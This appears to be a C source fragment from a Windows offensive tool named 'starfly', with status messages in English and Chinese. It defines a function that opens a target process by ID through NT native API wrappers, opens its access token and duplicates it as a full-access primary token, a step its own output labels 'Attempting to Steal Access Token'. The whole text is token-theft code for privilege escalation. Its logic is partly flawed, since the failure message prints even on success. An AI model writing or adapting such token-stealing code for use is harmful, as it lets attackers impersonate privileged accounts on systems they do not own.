#include <windows.h>
#include <stdio.h>
#include "nt.h"
#include "starfly.h"
#include <stdbool.h>
#include <locale.h>
HANDLE hToken;
HANDLE hTokenProcess;
void SFGetToken(DWORD pid) {
        hTokenProcess = 0xcccccccccccccccc;
        OBJECT_ATTRIBUTES objectAttributes;
        CLIENT_ID clientId;
        clientId.UniqueProcess = pid;
        clientId.UniqueThread = NULL;
        InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
        SFPrintStatus("Opening Process Handle", "正在打开进程句柄");
        status = SFNtOpenProcess(&hTokenProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);
        if ((hTokenProcess != 0xcccccccccccccccc) && (hTokenProcess != 0)) {
            hToken = 0xcccccccccccccccc;
            SFPrintStatus("Opening Process Token", "正在打开进程访问令牌");
            status = SFNtOpenProcessToken(hTokenProcess, MAXIMUM_ALLOWED, &hToken);
            if (hToken != 0xcccccccccccccccc && hToken != 0) {
                            hDupPriToken = 0xcccccccccccccccc;
                            hDupImpToken = 0xcccccccccccccccc;
                            o_mode = 1;
                            SFPrintStatus("Attempting to Steal Access Token", "尝试复制访问令牌");
                            status = SFNtDuplicateToken(hToken, TOKEN_ALL_ACCESS, NULL, FALSE, TokenPrimary, &hDupPriToken);
                }
                SFNtClose(hTokenProcess);
            }
        SFPrintError("Target Not Found or Failed to Obtain Token", "未找到目标或获取令牌失败");
    }